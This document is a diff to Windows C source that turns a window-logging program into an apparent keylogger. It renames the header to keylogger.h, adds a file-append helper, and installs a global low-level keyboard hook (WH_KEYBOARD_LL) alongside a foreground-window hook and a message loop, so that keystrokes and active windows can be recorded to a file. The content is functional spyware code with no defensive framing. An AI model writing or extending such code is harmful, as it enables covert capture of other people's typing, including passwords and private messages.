@@ -1,6 +1,19 @@
-#include "logs.h"
+#include "keylogger.h"
 
 HANDLE fd = NULL;
+
+int	initfd(char *fileName)
+{
+	fd = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (fd != INVALID_HANDLE_VALUE)
+		SetFilePointer(fd, 0, NULL, FILE_END);
+	else
+		return EXIT_FAILURE;
+
+	return EXIT_SUCCESS;
+}
 
 void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
 	DWORD event, // Event type
@@ -46,7 +59,6 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		SetFilePointer(fd, 0, NULL, FILE_END);
 	else
 		return 1;
-
 	HWINEVENTHOOK hook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
 		NULL,
@@ -54,13 +66,20 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		0, 0,
 		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
 	if (hook == NULL)
-	{
-		printf("Failed to set hook: %lu\n", GetLastError());
 		return 1;
-	}
+	HHOOK hKeyboardHook = SetWindowsHookExW(
+		WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0
+	);
+	if (hKeyboardHook == NULL)
+		return 1;
+
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
-		;
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
 	UnhookWinEvent(hook);
+	UnhookWindowsHookEx(hKeyboardHook);
 	return MessageBox(NULL, "hello, world", "caption", 0);
 }
